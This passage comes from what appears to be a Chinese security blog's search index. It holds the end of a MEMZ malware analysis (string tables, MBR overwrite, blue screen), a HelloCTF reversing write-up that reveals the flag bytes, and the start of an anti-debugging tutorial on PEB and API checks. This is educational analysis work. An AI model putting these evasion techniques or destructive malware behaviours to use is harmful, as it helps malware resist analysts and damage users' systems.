class=\"string\">&quot;http://google.co.ck/search?q=how+to+dow&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">00405054</span>                     dd offset aHttpGoogleCoCk_20 ; <span class=\"string\">&quot;http://google.co.ck/search?q=half+life+&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">00405058</span>                     dd offset aHttpGoogleCoCk_21 ; <span class=\"string\">&quot;http://google.co.ck/search?q=is+illumin&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">0040505</span>C                     dd offset aHttpGoogleCoCk_22 ; <span class=\"string\">&quot;http://google.co.ck/search?q=montage+pa&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">00405060</span>                     dd offset aHttpGoogleCoCk_23 ; <span class=\"string\">&quot;http://google.co.ck/search?q=the+memz+a&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">00405064</span>                     dd offset aHttpGoogleCoCk_24 ; <span class=\"string\">&quot;http://google.co.ck/search?q=stanky+dan&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">00405068</span>                     dd offset aHttpGoogleCoCk_25 ; <span class=\"string\">&quot;http://google.co.ck/search?q=john+cena+&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">0040506</span>C                     dd offset aHttpGoogleCoCk_26 ; <span class=\"string\">&quot;http://google.co.ck/search?q=vinesauce+&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">00405070</span>                     dd offset aHttpGoogleCoCk_27 ; <span class=\"string\">&quot;http://google.co.ck/search?q=skrillex+s&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">00405074</span>                     dd offset aHttpAnswersMic ; <span class=\"string\">&quot;http://answers.microsoft.com/en-us/prot&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">00405078</span>                     dd offset aHttpMotherboar ; <span class=\"string\">&quot;http://motherboard.vice.com/read/watch-&quot;</span>...</span><br><span class=\"line\">.data:<span class=\"number\">0040507</span>C                     dd offset aHttpPlayClubpe ; <span class=\"string\">&quot;http://play.clubpenguin.com&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">00405080</span>                     dd offset aHttpPcoptimize ; <span class=\"string\">&quot;http://pcoptimizerpro.com&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">00405084</span>                     dd offset aHttpSoftonicCo ; <span class=\"string\">&quot;http://softonic.com&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">00405088</span>                     dd offset aCalc         ; <span class=\"string\">&quot;calc&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">0040508</span>C                     dd offset File          ; <span class=\"string\">&quot;notepad&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">00405090</span>                     dd offset aCmd          ; <span class=\"string\">&quot;cmd&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">00405094</span>                     dd offset aWrite        ; <span class=\"string\">&quot;write&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">00405098</span>                     dd offset aRegedit      ; <span class=\"string\">&quot;regedit&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">0040509</span>C                     dd offset aExplorer     ; <span class=\"string\">&quot;explorer&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">004050</span>A0                     dd offset aTaskmgr      ; <span class=\"string\">&quot;taskmgr&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">004050</span>A4                     dd offset aMsconfig     ; <span class=\"string\">&quot;msconfig&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">004050</span>A8                     dd offset aMspaint      ; <span class=\"string\">&quot;mspaint&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">004050</span>AC                     dd offset aDevmgmtMsc   ; <span class=\"string\">&quot;devmgmt.msc&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">004050B</span>0                     dd offset aControl      ; <span class=\"string\">&quot;control&quot;</span></span><br><span class=\"line\">.data:<span class=\"number\">004050B</span>4                     dd offset aMmc          ; <span class=\"string\">&quot;mmc&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>至此，整个&#x2F;watchdog部分的分析就结束了。总结一下：当样本以&#x2F;watchdog参数运行时，会出现一个窗口，然后会打开乱七八糟的网页和一些系统程序，弹出信息框且当有窗口创建时会把宽高修改为随机大小，然后蓝屏。由于存在MBR的修改，导致重启时电脑无法正常启动，且会播放彩虹猫的动画。</p>\n<h1 id=\"二、-x2F-main\"><a href=\"#二、-x2F-main\" class=\"headerlink\" title=\"二、&#x2F;main\"></a>二、&#x2F;main</h1><p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId26.png\" alt=\"document_image_rId26\"></p>\n<p>以**&#x2F;main<strong>参数运行的代码部分相对来说比较简单，首先是两个提示性的弹窗，然后就是创建了5个以</strong>&#x2F;watchdog<strong>参数的进程，此处与前面判断进程数减少部分对应。最后是把自己的优先级到最高</strong>HIGH_PRIORITY_CLASS(0x80)**。</p>\n<h1 id=\"三、MBR部分函数\"><a href=\"#三、MBR部分函数\" class=\"headerlink\" title=\"三、MBR部分函数\"></a>三、MBR部分函数</h1><h3 id=\"1-MoveMouse-随机移动鼠\"><a href=\"#1-MoveMouse-随机移动鼠\" class=\"headerlink\" title=\"[1]MoveMouse-随机移动鼠\"></a>[1]MoveMouse-随机移动鼠</h3><p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId27.png\" alt=\"document_image_rId27\"></p>\n<h3 id=\"2-ChangeDeskBg-修改桌面背景\"><a href=\"#2-ChangeDeskBg-修改桌面背景\" class=\"headerlink\" title=\"[2]ChangeDeskBg-修改桌面背景\"></a>[2]ChangeDeskBg-修改桌面背景</h3><p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId28.png\" alt=\"document_image_rId28\"></p>\n<h3 id=\"3-sub-401688-枚举窗口\"><a href=\"#3-sub-401688-枚举窗口\" class=\"headerlink\" title=\"[3]sub_401688-枚举窗口\"></a>[3]sub_401688-枚举窗口</h3><p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId29.png\" alt=\"document_image_rId29\"></p>\n<h3 id=\"4-PlayBeep-播放声音\"><a href=\"#4-PlayBeep-播放声音\" class=\"headerlink\" title=\"[4]PlayBeep-播放声音\"></a>[4]PlayBeep-播放声音</h3><p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId30.png\" alt=\"document_image_rId30\"></p>\n<h3 id=\"5-sub-4016CD-乱画桌面\"><a href=\"#5-sub-4016CD-乱画桌面\" class=\"headerlink\" title=\"[5]sub_4016CD-乱画桌面\"></a>[5]sub_4016CD-乱画桌面</h3><p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId31.png\" alt=\"document_image_rId31\"></p>\n<h3 id=\"6-autoKeydown-自动按键\"><a href=\"#6-autoKeydown-自动按键\" class=\"headerlink\" title=\"[6]autoKeydown-自动按键\"></a>[6]autoKeydown-自动按键</h3><p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId32.png\" alt=\"document_image_rId32\"></p>\n<h3 id=\"7-DrawIcon-随机位置画Icon\"><a href=\"#7-DrawIcon-随机位置画Icon\" class=\"headerlink\" title=\"[7]DrawIcon-随机位置画Icon\"></a>[7]DrawIcon-随机位置画Icon</h3><p><img src=\"/../images/Virus/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/document_image_rId33.png\" alt=\"document_image_rId33\"></p>\n","categories":["Virus"]},{"title":"攻防世界-逆向题笔记{HelloCTF}","url":"/2024/04/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7BHelloCTF%7D/","content":"<p>分析对象：Hello,CTF</p>\n<p>工具：ida、exeinfope</p>\n<p>步骤：1）、运行查看效果</p>\n<p>2）、PE工具查壳</p>\n<p>3）、查看文件平台</p>\n<p>4）、如果有壳就脱壳，无壳进行第四步</p>\n<p>5）、文件拖入ida进行分析</p>\n<p>6）、解密</p>\n<p><strong>一、运行查看效果</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7BHelloCTF%7D/document_image_rId4.png\" alt=\"document_image_rId4\"></p>\n<p>可以发现输入错误的注册码后，又从新开始要求输入，可知他是一个循环。</p>\n<p><strong>二、PE工具查壳</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7BHelloCTF%7D/document_image_rId5.png\" alt=\"document_image_rId5\"></p>\n<p>无壳。</p>\n<p><strong>三、查看文件平台</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7BHelloCTF%7D/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<p>依旧为<strong>32位程序</strong>，直接32位ida打开</p>\n<p><strong>四、无</strong></p>\n<p><strong>五、文件拖入ida进行分析</strong></p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7BHelloCTF%7D/document_image_rId7.png\" alt=\"document_image_rId7\"></p>\n<p>依旧先<strong>搜索字符串</strong>，看看有没有<strong>可用内容</strong>或者<strong>明文flag</strong>。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7BHelloCTF%7D/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<p>发现这里有可用信息，**success! ,**双击后交叉引用到此处。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7BHelloCTF%7D/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<p>拉到头，发现该函数是<strong>main</strong>函数。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7BHelloCTF%7D/document_image_rId10.png\" alt=\"document_image_rId10\"></p>\n<p>并发现该处有可疑之处，猜测是加密密钥。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7BHelloCTF%7D/document_image_rId11.png\" alt=\"document_image_rId11\"></p>\n<p>简单进行分析后，发现输入的内容长度不能&gt;17，但是在最后比较的时候却和v13的比较。通过手算v13长度可只为34，而17的两倍就是为34。猜测程序将输入的内容进行了一个类似翻倍的操作。那么看看他是怎么翻倍操作。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7BHelloCTF%7D/document_image_rId12.png\" alt=\"document_image_rId12\"></p>\n<p>很明显，他把输入内容的字符转换为十六进制后保存。放一张ASCLL码表</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7BHelloCTF%7D/document_image_rId13.png\" alt=\"document_image_rId13\"></p>\n<p>转换过程非常明显。比如输入的内容为ABC，那么经过程序转换就为 0x41 0x42 0x43,存入变量中就是414243。</p>\n<p><strong>六、解密</strong></p>\n<p>明白了转换过程，那么我们就可以解密了。</p>\n<p>可以写脚本，也可以手动转换，这里就直接脚本转换</p>\n<p>将密钥两辆分解得到 43 72 61 63 6b 4d 65 4a 75 73 74 46 6f 72 46 75 6e</p>\n<p>因为这些都是十六进制的Ascll码，直接对应表转换为字符即可。</p>\n<p><img src=\"/../images/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91%E9%A2%98%E7%AC%94%E8%AE%B0%7BHelloCTF%7D/document_image_rId14.png\" alt=\"document_image_rId14\"></p>\n<p><strong>总结：</strong></p>\n<p>这题太简单，没什么好总结 ，就是这么膨胀！           &#x3D;。&#x3D;</p>\n","categories":["CTF"]},{"title":"从零开始学习反调试","url":"/2024/04/21/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0%E5%8F%8D%E8%B0%83%E8%AF%95/","content":"<h1 id=\"一、PEB系列\"><a href=\"#一、PEB系列\" class=\"headerlink\" title=\"一、PEB系列\"></a>一、PEB系列</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">kd&gt; dt _PEB</span><br><span class=\"line\">ntdll!_PEB</span><br><span class=\"line\">   +0x000 InheritedAddressSpace : UChar</span><br><span class=\"line\">   +0x001 ReadImageFileExecOptions : UChar</span><br><span class=\"line\">   +0x002 BeingDebugged    : UChar</span><br><span class=\"line\">   +0x003 BitField         : UChar</span><br><span class=\"line\">   +0x003 ImageUsesLargePages : Pos 0, 1 Bit</span><br><span class=\"line\">   +0x003 IsProtectedProcess : Pos 1, 1 Bit</span><br><span class=\"line\">   +0x003 IsLegacyProcess  : Pos 2, 1 Bit</span><br><span class=\"line\">   +0x003 IsImageDynamicallyRelocated : Pos 3, 1 Bit</span><br><span class=\"line\">   +0x003 SkipPatchingUser32Forwarders : Pos 4, 1 Bit</span><br><span class=\"line\">   +0x003 SpareBits        : Pos 5, 3 Bits</span><br><span class=\"line\">   +0x004 Mutant           : Ptr32 Void</span><br><span class=\"line\">   +0x008 ImageBaseAddress : Ptr32 Void</span><br><span class=\"line\">   +0x00c Ldr              : Ptr32 _PEB_LDR_DATA</span><br><span class=\"line\">   +0x010 ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS</span><br><span class=\"line\">   +0x014 SubSystemData    : Ptr32 Void</span><br><span class=\"line\">   +0x018 ProcessHeap      : Ptr32 Void</span><br><span class=\"line\">   +0x01c FastPebLock      : Ptr32 _RTL_CRITICAL_SECTION</span><br><span class=\"line\">   +0x020 AtlThunkSListPtr : Ptr32 Void</span><br><span class=\"line\">   +0x024 IFEOKey          : Ptr32 Void</span><br><span class=\"line\">   +0x028 CrossProcessFlags : Uint4B</span><br><span class=\"line\">   +0x028 ProcessInJob     : Pos 0, 1 Bit</span><br><span class=\"line\">   +0x028 ProcessInitializing : Pos 1, 1 Bit</span><br><span class=\"line\">   +0x028 ProcessUsingVEH  : Pos 2, 1 Bit</span><br><span class=\"line\">   +0x028 ProcessUsingVCH  : Pos 3, 1 Bit</span><br><span class=\"line\">   +0x028 ProcessUsingFTH  : Pos 4, 1 Bit</span><br><span class=\"line\">   +0x028 ReservedBits0    : Pos 5, 27 Bits</span><br><span class=\"line\">   +0x02c KernelCallbackTable : Ptr32 Void</span><br><span class=\"line\">   +0x02c UserSharedInfoPtr : Ptr32 Void</span><br><span class=\"line\">   +0x030 SystemReserved   : [1] Uint4B</span><br><span class=\"line\">   +0x034 AtlThunkSListPtr32 : Uint4B</span><br><span class=\"line\">   +0x038 ApiSetMap        : Ptr32 Void</span><br><span class=\"line\">   +0x03c TlsExpansionCounter : Uint4B</span><br><span class=\"line\">   +0x040 TlsBitmap        : Ptr32 Void</span><br><span class=\"line\">   +0x044 TlsBitmapBits    : [2] Uint4B</span><br><span class=\"line\">   +0x04c ReadOnlySharedMemoryBase : Ptr32 Void</span><br><span class=\"line\">   +0x050 HotpatchInformation : Ptr32 Void</span><br><span class=\"line\">   +0x054 ReadOnlyStaticServerData : Ptr32 Ptr32 Void</span><br><span class=\"line\">   +0x058 AnsiCodePageData : Ptr32 Void</span><br><span class=\"line\">   +0x05c OemCodePageData  : Ptr32 Void</span><br><span class=\"line\">   +0x060 UnicodeCaseTableData : Ptr32 Void</span><br><span class=\"line\">   +0x064 NumberOfProcessors : Uint4B</span><br><span class=\"line\">   +0x068 NtGlobalFlag     : Uint4B</span><br><span class=\"line\">   +0x070 CriticalSectionTimeout : _LARGE_INTEGER</span><br><span class=\"line\">   +0x078 HeapSegmentReserve : Uint4B</span><br><span class=\"line\">   +0x07c HeapSegmentCommit : Uint4B</span><br><span class=\"line\">   +0x080 HeapDeCommitTotalFreeThreshold : Uint4B</span><br><span class=\"line\">   +0x084 HeapDeCommitFreeBlockThreshold : Uint4B</span><br><span class=\"line\">   +0x088 NumberOfHeaps    : Uint4B</span><br><span class=\"line\">   +0x08c MaximumNumberOfHeaps : Uint4B</span><br><span class=\"line\">   +0x090 ProcessHeaps     : Ptr32 Ptr32 Void</span><br><span class=\"line\">   +0x094 GdiSharedHandleTable : Ptr32 Void</span><br><span class=\"line\">   +0x098 ProcessStarterHelper : Ptr32 Void</span><br><span class=\"line\">   +0x09c GdiDCAttributeList : Uint4B</span><br><span class=\"line\">   +0x0a0 LoaderLock       : Ptr32 _RTL_CRITICAL_SECTION</span><br><span class=\"line\">   +0x0a4 OSMajorVersion   : Uint4B</span><br><span class=\"line\">   +0x0a8 OSMinorVersion   : Uint4B</span><br><span class=\"line\">   +0x0ac OSBuildNumber    : Uint2B</span><br><span class=\"line\">   +0x0ae OSCSDVersion     : Uint2B</span><br><span class=\"line\">   +0x0b0 OSPlatformId     : Uint4B</span><br><span class=\"line\">   +0x0b4 ImageSubsystem   : Uint4B</span><br><span class=\"line\">   +0x0b8 ImageSubsystemMajorVersion : Uint4B</span><br><span class=\"line\">   +0x0bc ImageSubsystemMinorVersion : Uint4B</span><br><span class=\"line\">   +0x0c0 ActiveProcessAffinityMask : Uint4B</span><br><span class=\"line\">   +0x0c4 GdiHandleBuffer  : [34] Uint4B</span><br><span class=\"line\">   +0x14c PostProcessInitRoutine : Ptr32     void </span><br><span class=\"line\">   +0x150 TlsExpansionBitmap : Ptr32 Void</span><br><span class=\"line\">   +0x154 TlsExpansionBitmapBits : [32] Uint4B</span><br><span class=\"line\">   +0x1d4 SessionId        : Uint4B</span><br><span class=\"line\">   +0x1d8 AppCompatFlags   : _ULARGE_INTEGER</span><br><span class=\"line\">   +0x1e0 AppCompatFlagsUser : _ULARGE_INTEGER</span><br><span class=\"line\">   +0x1e8 pShimData        : Ptr32 Void</span><br><span class=\"line\">   +0x1ec AppCompatInfo    : Ptr32 Void</span><br><span class=\"line\">   +0x1f0 CSDVersion       : _UNICODE_STRING</span><br><span class=\"line\">   +0x1f8 ActivationContextData : Ptr32 _ACTIVATION_CONTEXT_DATA</span><br><span class=\"line\">   +0x1fc ProcessAssemblyStorageMap : Ptr32 _ASSEMBLY_STORAGE_MAP</span><br><span class=\"line\">   +0x200 SystemDefaultActivationContextData : Ptr32 _ACTIVATION_CONTEXT_DATA</span><br><span class=\"line\">   +0x204 SystemAssemblyStorageMap : Ptr32 _ASSEMBLY_STORAGE_MAP</span><br><span class=\"line\">   +0x208 MinimumStackCommit : Uint4B</span><br><span class=\"line\">   +0x20c FlsCallback      : Ptr32 _FLS_CALLBACK_INFO</span><br><span class=\"line\">   +0x210 FlsListHead      : _LIST_ENTRY</span><br><span class=\"line\">   +0x218 FlsBitmap        : Ptr32 Void</span><br><span class=\"line\">   +0x21c FlsBitmapBits    : [4] Uint4B</span><br><span class=\"line\">   +0x22c FlsHighIndex     : Uint4B</span><br><span class=\"line\">   +0x230 WerRegistrationData : Ptr32 Void</span><br><span class=\"line\">   +0x234 WerShipAssertPtr : Ptr32 Void</span><br><span class=\"line\">   +0x238 pContextData     : Ptr32 Void</span><br><span class=\"line\">   +0x23c pImageHeaderHash : Ptr32 Void</span><br><span class=\"line\">   +0x240 TracingFlags     : Uint4B</span><br><span class=\"line\">   +0x240 HeapTracingEnabled : Pos 0, 1 Bit</span><br><span class=\"line\">   +0x240 CritSecTracingEnabled : Pos 1, 1 Bit</span><br><span class=\"line\">   +0x240 SpareTracingBits : Pos 2, 30 Bits</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"BeingDebugged\"><a href=\"#BeingDebugged\" class=\"headerlink\" title=\"BeingDebugged\"></a>BeingDebugged</h2><p>&#x3D;0表示未调试,≠0表示调试。</p>\n<h2 id=\"NtGlobalFlag\"><a href=\"#NtGlobalFlag\" class=\"headerlink\" title=\"NtGlobalFlag\"></a>NtGlobalFlag</h2><p>&#x3D;0表示未调试,≠0表示调试。在 Windows NT中，有一组标志存储在全局变量NtGlobalFlag中，这在整个系统中是通用的。在启动时，NtGlobalFlag全局系统变量将使用系统注册表项中的值进行初始化：<code>[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\GlobalFlag]</code>，要检查进程是否已使用调试器启动，请检查PEB结构中NtGlobal标志字段的值。此字段分别位于x32和x64系统的PEB 0x068和0x0bc偏移量。</p>\n<p><img src=\"/.../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0%E5%8F%8D%E8%B0%83%E8%AF%95/image-20221219165530733.png\" alt=\"image-20221219165530733\"></p>\n<h2 id=\"ProcessHeap\"><a href=\"#ProcessHeap\" class=\"headerlink\" title=\"ProcessHeap\"></a>ProcessHeap</h2><table>\n<thead>\n<tr>\n<th>标志名</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>ProcessHeap-&gt;Flags</td>\n<td>&#x3D;2表示未调试,≠2表示调试。</td>\n</tr>\n<tr>\n<td>ProcessHeap-&gt;ForceFlags</td>\n<td>&#x3D;0表示未调试,≠0表示调试。</td>\n</tr>\n</tbody></table>\n<h2 id=\"CrossProcessFlags\"><a href=\"#CrossProcessFlags\" class=\"headerlink\" title=\"CrossProcessFlags\"></a>CrossProcessFlags</h2><p>ULONG类型，每个位表达的含义不同，其中第四位为ProcessUsingVEH，可用来检测是否使用了VEH。</p>\n<p><a href=\"https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/peb/crossprocessflags.htm\">https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/peb/crossprocessflags.htm</a><br /><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0%E5%8F%8D%E8%B0%83%E8%AF%95/image-20221221153952332.png\" alt=\"image-20221221153952332\"></p>\n<h1 id=\"二、API系列\"><a href=\"#二、API系列\" class=\"headerlink\" title=\"二、API系列\"></a>二、API系列</h1><h2 id=\"IsDebuggerPresent\"><a href=\"#IsDebuggerPresent\" class=\"headerlink\" title=\"IsDebuggerPresent\"></a>IsDebuggerPresent</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">BOOL <span class=\"title\">IsDebuggerPresent</span><span class=\"params\">()</span></span>;</span><br></pre></td></tr></table></figure>\n\n<p>返回0表示未调试，返回1表示调试，实际上是读取BeingDebugged的值。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0%E5%8F%8D%E8%B0%83%E8%AF%95/image-20221219144519199.png\" alt=\"image-20221219144519199\"></p>\n<h2 id=\"CheckRemoteDebuggerPresent\"><a href=\"#CheckRemoteDebuggerPresent\" class=\"headerlink\" title=\"CheckRemoteDebuggerPresent\"></a>CheckRemoteDebuggerPresent</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">BOOL <span class=\"title\">CheckRemoteDebuggerPresent</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in]      HANDLE hProcess,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in, out] PBOOL  pbDebuggerPresent</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">)</span></span>;</span><br></pre></td></tr></table></figure>\n\n<p>检测进程是否处于调试状态，且其不仅仅可以检测自身是否处于调试状态，还可以检测其他程序是否处于调试状态，底层为调用NtQueryInformationProcess（ProcessDebugPort）。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0%E5%8F%8D%E8%B0%83%E8%AF%95/image-20221219151607807.png\" alt=\"image-20221219151607807\"></p>\n<h2 id=\"DbgBreakPoint\"><a href=\"#DbgBreakPoint\" class=\"headerlink\" title=\"DbgBreakPoint\"></a>DbgBreakPoint</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">DebugBreak</span><span class=\"params\">()</span></span>;</span><br></pre></td></tr></table></figure>\n\n<p>软件断点,int3。调试器附加后会停留在此函数上进行中断等待,将函数头部改写ret可让调试结束</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0%E5%8F%8D%E8%B0%83%E8%AF%95/image-20221219144823922.png\" alt=\"image-20221219144823922\"></p>\n<h2 id=\"DbgUiRemoteBreakin\"><a href=\"#DbgUiRemoteBreakin\" class=\"headerlink\" title=\"DbgUiRemoteBreakin\"></a>DbgUiRemoteBreakin</h2><p>ntdll提供的用于在目标进程中创建远线程后下软件断点的函数,hook该函数可让调试器下断点时失败。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0%E5%8F%8D%E8%B0%83%E8%AF%95/image-20221219145026132.png\" alt=\"image-20221219145026132\"></p>\n<h2 id=\"NtQueryInformationProcess\"><a href=\"#NtQueryInformationProcess\" class=\"headerlink\" title=\"NtQueryInformationProcess\"></a>NtQueryInformationProcess</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">__kernel_entry NTSTATUS <span class=\"title\">NtQueryInformationProcess</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in]            HANDLE           ProcessHandle,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in]            PROCESSINFOCLASS ProcessInformationClass,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [out]           PVOID            ProcessInformation,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in]            ULONG            ProcessInformationLength,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [out, optional] PULONG           ReturnLength</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">)</span></span>;</span><br></pre></td></tr></table></figure>\n\n<p>ProcessInformationClass为一个宏，用于调试检测的值如下：</p>\n<table>\n<thead>\n<tr>\n<th>值</th>\n<th>含义</th>\n<th>补充</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>ProcessDebugPort（0x7）</td>\n<td>检索一个 <strong>DWORD_PTR</strong> 值，该值是进程的调试器的端口号。 非零值指示进程在环 3 调试器的控制下运行。</td>\n<td>无</td>\n</tr>\n<tr>\n<td>ProcessDebugObjectHandle(0x1E)</td>\n<td>调试器会为被调试的进程创建一个调试对象，该参数能获取调试对象的句柄,不为0则为调试。</td>\n<td>无</td>\n</tr>\n<tr>\n<td>ProcessDebugFlags（0x1F）</td>\n<td>调试标志。调试时为0，未调试为1。</td>\n<td>无</td>\n</tr>\n</tbody></table>\n<h2 id=\"NtQueryInformationThread\"><a href=\"#NtQueryInformationThread\" class=\"headerlink\" title=\"NtQueryInformationThread\"></a>NtQueryInformationThread</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">__kernel_entry NTSTATUS <span class=\"title\">NtQueryInformationThread</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in]            HANDLE          ThreadHandle,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in]            THREADINFOCLASS ThreadInformationClass,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in, out]       PVOID           ThreadInformation,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in]            ULONG           ThreadInformationLength,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [out, optional] PULONG          ReturnLength</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">)</span></span>;</span><br></pre></td></tr></table></figure>\n\n<p>检查当前线程上下文的Dr寄存器。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">WOW64_CONTEXT context = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">context.ContextFlags = WOW64_CONTEXT_ALL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"built_in\">NT_SUCCESS</span>(<span class=\"built_in\">NtQueryInformationThread</span>(NtCurrentThread, ThreadWow64Context, 